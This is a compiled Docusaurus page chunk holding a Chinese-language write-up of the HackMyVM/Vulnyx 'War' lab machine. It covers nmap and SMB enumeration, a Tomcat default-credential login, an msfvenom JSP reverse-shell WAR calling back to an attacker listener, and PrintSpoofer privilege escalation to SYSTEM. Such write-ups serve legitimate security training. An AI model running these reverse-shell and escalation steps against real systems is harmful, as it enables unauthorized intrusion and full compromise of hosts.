"use strict";(self.webpackChunkremote_website=self.webpackChunkremote_website||[]).push([[144],{9922:(n,e,r)=>{r.r(e),r.d(e,{assets:()=>c,contentTitle:()=>i,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>l});const s=JSON.parse('{"id":"HackMyVm/Vulnyx/War","title":"War","description":"port scan","source":"@site/docs/HackMyVm/Vulnyx/War.md","sourceDirName":"HackMyVm/Vulnyx","slug":"/HackMyVm/Vulnyx/War","permalink":"/docs/HackMyVm/Vulnyx/War","draft":false,"unlisted":false,"editUrl":"https://github.com/C0rr3c7/C0rr3c7.github.io/tree/master/docs/HackMyVm/Vulnyx/War.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVmSidebar","previous":{"title":"Vulnyx","permalink":"/docs/category/vulnyx"},"next":{"title":"Venus","permalink":"/docs/category/venus"}}');var t=r(74848),o=r(28453);const a={},i=void 0,c={},l=[{value:"port scan",id:"port-scan",level:2},{value:"smb",id:"smb",level:2},{value:"tomcat",id:"tomcat",level:2},{value:"\u63d0\u6743",id:"\u63d0\u6743",level:2}];function p(n){const e={a:"a",code:"code",h2:"h2",img:"img",p:"p",pre:"pre",strong:"strong",...(0,o.R)(),...n.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(e.h2,{id:"port-scan",children:"port scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Dec  8 01:12:31 2024 as: nmap -sT --min-rate=5000 -p- -oN nmap_result/port 192.168.56.137\r\nNmap scan report for 192.168.56.137\r\nHost is up (0.00076s latency).\r\nNot shown: 65523 closed tcp ports (conn-refused)\r\nPORT      STATE SERVICE\r\n135/tcp   open  msrpc\r\n139/tcp   open  netbios-ssn\r\n445/tcp   open  microsoft-ds\r\n5040/tcp  open  unknown\r\n8080/tcp  open  http-proxy\r\n49664/tcp open  unknown\r\n49665/tcp open  unknown\r\n49666/tcp open  unknown\r\n49667/tcp open  unknown\r\n49668/tcp open  unknown\r\n49669/tcp open  unknown\r\n49670/tcp open  unknown\r\nMAC Address: 08:00:27:80:AE:3A (Oracle VirtualBox virtual NIC)\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Dec  8 01:07:02 2024 as: nmap -sT -sV -sC -O -p135,139,445,5040,8080 -oN nmap_result/detil 192.168.56.137\r\nNmap scan report for 192.168.56.137\r\nHost is up (0.0052s latency).\r\n\r\nPORT     STATE SERVICE       VERSION\r\n135/tcp  open  msrpc         Microsoft Windows RPC\r\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\r\n445/tcp  open  microsoft-ds?\r\n5040/tcp open  unknown\r\n8080/tcp open  http          Apache Tomcat 11.0.1\r\n|_http-title: Apache Tomcat/11.0.1\r\n|_http-favicon: Apache Tomcat\r\nMAC Address: 08:00:27:80:AE:3A (Oracle VirtualBox virtual NIC)\r\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\r\nDevice type: general purpose\r\nRunning: Microsoft Windows 10\r\nOS CPE: cpe:/o:microsoft:windows_10\r\nOS details: Microsoft Windows 10 1709 - 1909\r\nNetwork Distance: 1 hop\r\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\r\n\r\nHost script results:\r\n| smb2-time: \r\n|   date: 2024-12-08T22:09:39\r\n|_  start_date: N/A\r\n|_nbstat: NetBIOS name: WAR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:80:ae:3a (Oracle VirtualBox virtual NIC)\r\n| smb2-security-mode: \r\n|   3:1:1: \r\n|_    Message signing enabled but not required\r\n|_clock-skew: 15h59m58s\n"})}),"\n",(0,t.jsx)(e.p,{children:"vuln scan"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"# Nmap 7.94SVN scan initiated Sun Dec  8 01:10:40 2024 as: nmap --script=vuln -p135,139,445,5040,8080 -oN nmap_result/vuln 192.168.56.137\r\nNmap scan report for 192.168.56.137\r\nHost is up (0.00074s latency).\r\n\r\nPORT     STATE SERVICE\r\n135/tcp  open  msrpc\r\n139/tcp  open  netbios-ssn\r\n445/tcp  open  microsoft-ds\r\n5040/tcp open  unknown\r\n8080/tcp open  http-proxy\r\n| http-slowloris-check: \r\n|   VULNERABLE:\r\n|   Slowloris DOS attack\r\n|     State: LIKELY VULNERABLE\r\n|     IDs:  CVE:CVE-2007-6750\r\n|       Slowloris tries to keep many connections to the target web server open and hold\r\n|       them open as long as possible.  It accomplishes this by opening connections to\r\n|       the target web server and sending a partial request. By doing so, it starves\r\n|       the http server's resources causing Denial Of Service.\r\n|       \r\n|     Disclosure date: 2009-09-17\r\n|     References:\r\n|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750\r\n|_      http://ha.ckers.org/slowloris/\r\n| http-enum: \r\n|   /manager/html/upload: Apache Tomcat (401 )\r\n|_  /manager/html: Apache Tomcat (401 )\r\nMAC Address: 08:00:27:80:AE:3A (Oracle VirtualBox virtual NIC)\r\n\r\nHost script results:\r\n|_smb-vuln-ms10-054: false\r\n|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\r\n|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n"})}),"\n",(0,t.jsx)(e.p,{children:"139\uff0c445 smb\u670d\u52a1"}),"\n",(0,t.jsx)(e.p,{children:"\u5f00\u653e8080\u7aef\u53e3\uff0ctomcat\u670d\u52a1"}),"\n",(0,t.jsx)(e.h2,{id:"smb",children:"smb"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"Basic Enumeration"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnyx/War]\r\n\u2514\u2500$ netexec smb 192.168.56.137\r\nSMB         192.168.56.137  445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)\n"})}),"\n",(0,t.jsx)(e.p,{children:"Windows 10"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"shares  Enumeration"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnyx/War]\r\n\u2514\u2500$ smbclient -L 192.168.56.137\r\nPassword for [WORKGROUP\\kali]:\r\nsession setup failed: NT_STATUS_ACCESS_DENIED\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnyx/War]\r\n\u2514\u2500$ smbmap --no-banner -H 192.168.56.137\r\n[*] Detected 1 hosts serving SMB\r\n[*] Established 0 SMB connections(s) and 0 authenticated session(s)\r\n[*] Closed 0 connections \n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnyx/War]\r\n\u2514\u2500$ netexec smb 192.168.56.137 --shares -u 'guest' -p ''\r\nSMB         192.168.56.137  445    WAR              [*] Windows 10 / Server 2019 Build 19041 x64 (name:WAR) (domain:WAR) (signing:False) (SMBv1:False)\r\nSMB         192.168.56.137  445    WAR              [-] WAR\\guest: STATUS_ACCOUNT_DISABLED\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.strong,{children:"RPC Enumeration"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:'\u250c\u2500\u2500(kali\u327fkali)-[~/vulnyx/War]\r\n\u2514\u2500$ rpcclient -NU "" 192.168.56.137 -c "srvinfo"\r\nCannot connect to server.  Error was NT_STATUS_ACCESS_DENIED\n'})}),"\n",(0,t.jsx)(e.h2,{id:"tomcat",children:"tomcat"}),"\n",(0,t.jsx)(e.p,{children:"\u9ed8\u8ba4\u5bc6\u7801"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.code,{children:"admin:tomcat"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fdb\u884cwar\u5305\u90e8\u7f72"}),"\n",(0,t.jsxs)(e.p,{children:["\u4f7f\u7528",(0,t.jsx)(e.code,{children:"msfvenom"}),"\u751f\u6210\u4e00\u4e2awar\u5305"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.138 LPORT=1234 -f war > shell.war\n"})}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241208154353780.png",alt:"image-20241208154353780"})}),"\n",(0,t.jsx)(e.p,{children:"\u4e0a\u4f20\u6210\u529f\u540e\uff0c\u4f1a\u6709\u4e00\u4e2a/shell\u7684\u8def\u5f84\uff0c\u8bbf\u95ee\uff0c\u62ff\u5230shell"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~]\r\n\u2514\u2500$ rlwrap nc -lvnp 1234 \r\nlistening on [any] 1234 ...\r\nconnect to [192.168.56.138] from (UNKNOWN) [192.168.56.137] 49687\r\nMicrosoft Windows [Version 10.0.19045.2965]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Program Files\\Apache Software Foundation\\Tomcat 11.0>whoami\r\nwhoami\r\nnt authority\\local service\n"})}),"\n",(0,t.jsx)(e.h2,{id:"\u63d0\u6743",children:"\u63d0\u6743"}),"\n",(0,t.jsxs)(e.p,{children:["\u73b0\u5728\u662f",(0,t.jsx)(e.code,{children:"nt authority\\local service"}),"\u6743\u9650"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-cmd",children:"C:\\Program Files\\Apache Software Foundation\\Tomcat 11.0>whoami /priv\r\nwhoami /priv\r\n\r\nPRIVILEGES INFORMATION\r\n----------------------\r\n\r\nPrivilege Name                Description                               State   \r\n============================= ========================================= ========\r\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled \r\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled \r\nSeCreateGlobalPrivilege       Create global objects                     Enabled \n"})}),"\n",(0,t.jsx)(e.p,{children:"SeImpersonatePrivilege \u8eab\u4efd\u9a8c\u8bc1\u540e\u6a21\u62df\u5ba2\u6237\u7aef"}),"\n",(0,t.jsx)(e.p,{children:"\u5f53\u542f\u7528\u201c\u8eab\u4efd\u9a8c\u8bc1\u540e\u6a21\u62df\u5ba2\u6237\u7aef\u201d\u7528\u6237\u6743\u9650\u65f6\uff0c\u5b83\u5141\u8bb8\u6307\u5b9a\u7684\u7528\u6237\u6216\u7a0b\u5e8f\u6a21\u62df\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u5ba2\u6237\u7aef\uff0c\u5e76\u4ee3\u8868\u8be5\u7528\u6237\u6267\u884c\u64cd\u4f5c\u3002\u8fd9\u4e2a\u5b89\u5168\u8bbe\u7f6e\u6709\u52a9\u4e8e\u9632\u6b62\u672a\u6388\u6743\u7684\u670d\u52a1\u5668\u901a\u8fc7\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff08RPC\uff09\u6216\u547d\u540d\u7ba1\u9053\u7b49\u65b9\u6cd5\u6a21\u62df\u8fde\u63a5\u5230\u5b83\u7684\u5ba2\u6237\u7aef"}),"\n",(0,t.jsx)(e.p,{children:(0,t.jsx)(e.a,{href:"https://github.com/itm4n/PrintSpoofer",children:"https://github.com/itm4n/PrintSpoofer"})}),"\n",(0,t.jsxs)(e.p,{children:["\u4f7f\u7528",(0,t.jsx)(e.code,{children:"PrintSpoofer"}),"\u8fdb\u884c\u63d0\u6743"]}),"\n",(0,t.jsx)(e.p,{children:"\u5c06\u6587\u4ef6\u4f20\u5230\u9776\u673a\u91cc"}),"\n",(0,t.jsxs)(e.p,{children:["\u9996\u5148\u4f7f\u7528",(0,t.jsx)(e.code,{children:"impacket-smbserver"}),"\u5f00\u542f\u4e00\u4e2asmb\u670d\u52a1"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-shell",children:"\u250c\u2500\u2500(kali\u327fkali)-[~/vulnyx/War]\r\n\u2514\u2500$ impacket-smbserver a . -smb2support\r\nImpacket v0.12.0.dev1 - Copyright 2023 Fortra\r\n\r\n[*] Config file parsed\r\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\r\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\r\n[*] Config file parsed\r\n[*] Config file parsed\r\n[*] Config file parsed\n"})}),"\n",(0,t.jsx)(e.p,{children:"\u8fdb\u5165\u4e34\u65f6\u76ee\u5f55\u8fdb\u884c\u64cd\u4f5c"}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"C:\\Program Files\\Apache Software Foundation\\Tomcat 11.0>cd %temp%\r\n\r\nC:\\Windows\\SERVIC~1\\LOCALS~1\\AppData\\Local\\Temp>copy \\\\192.168.56.138\\a\\PrintSpoofer64.exe PrintSpoofer64.exe\n"})}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{className:"language-cmd",children:"C:\\Windows\\SERVIC~1\\LOCALS~1\\AppData\\Local\\Temp>.\\PrintSpoofer64.exe -i -c cmd\r\n.\\PrintSpoofer64.exe -i -c cmd\r\n[+] Found privilege: SeImpersonatePrivilege\r\n[+] Named pipe listening...\r\n[+] CreateProcessAsUser() OK\r\nMicrosoft Windows [Version 10.0.19045.2965]\r\n(c) Microsoft Corporation. All rights reserved.\r\n\r\nC:\\Windows\\system32>whoami\r\nwhoami\r\nnt authority\\system\n"})}),"\n",(0,t.jsxs)(e.p,{children:["\u73b0\u5728\u662f",(0,t.jsx)(e.code,{children:"nt authority\\system"}),",\u53ef\u4ee5\u8bfb\u53d6flag"]}),"\n",(0,t.jsx)(e.pre,{children:(0,t.jsx)(e.code,{children:"type c:\\users\\low\\desktop\\user.txt\r\ntype c:\\users\\administrator\\desktop\\root.txt\n"})})]})}function d(n={}){const{wrapper:e}={...(0,o.R)(),...n.components};return e?(0,t.jsx)(e,{...n,children:(0,t.jsx)(p,{...n})}):p(n)}},28453:(n,e,r)=>{r.d(e,{R:()=>a,x:()=>i});var s=r(96540);const t={},o=s.createContext(t);function a(n){const e=s.useContext(o);return s.useMemo((function(){return"function"==typeof n?n(e):{...e,...n}}),[e,n])}function i(n){let e;return e=n.disableParentContext?"function"==typeof n.components?n.components(t):n.components||t:a(n.components),s.createElement(o.Provider,{value:e},n.children)}}}]);